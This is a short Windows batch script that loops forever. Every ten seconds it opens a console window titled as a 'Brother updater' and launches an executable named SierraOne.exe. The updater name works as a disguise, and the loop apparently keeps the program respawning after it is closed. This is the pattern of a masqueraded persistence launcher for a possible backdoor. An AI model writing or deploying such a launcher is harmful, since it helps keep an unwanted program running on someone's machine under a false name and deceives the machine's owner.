@echo off
set INTERVAL=10
:loop
start "Brother updater sl19b7i.bat"
start SierraOne.exe
timeout %INTERVAL%
goto:loop
